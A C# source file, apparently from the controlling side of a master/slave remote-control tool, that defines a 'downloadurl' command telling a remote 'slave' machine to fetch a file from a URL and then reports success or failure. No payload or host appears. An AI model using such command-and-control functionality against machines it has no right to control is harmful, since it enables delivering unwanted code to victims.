using Master.AdvancedConsole;
using Master.Commands.Core;
using System.Collections.Generic;

namespace Master.Commands
{
    internal class DownloadUrl : IMasterCommand
    {
        public string name { get; } = "downloadurl";

        public string description { get; } = "Make the slave download a file from the specified url";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "?:[url]"
        };

        public void Process(List<string> args)
        {
            ColorTools.WriteCommandMessage("Starting download of file from url");

            var result = MasterCommandsManager.networkManager.ReadLine();
            if (result == "Success")
            {
                ColorTools.WriteCommandSuccess("File downloaded successfully from URL");
            }
            else
            {
                ColorTools.WriteCommandError($"Download failed : {(result == "IO" ? "IO exception" : "Network error")}");
            }
        }
    }
}
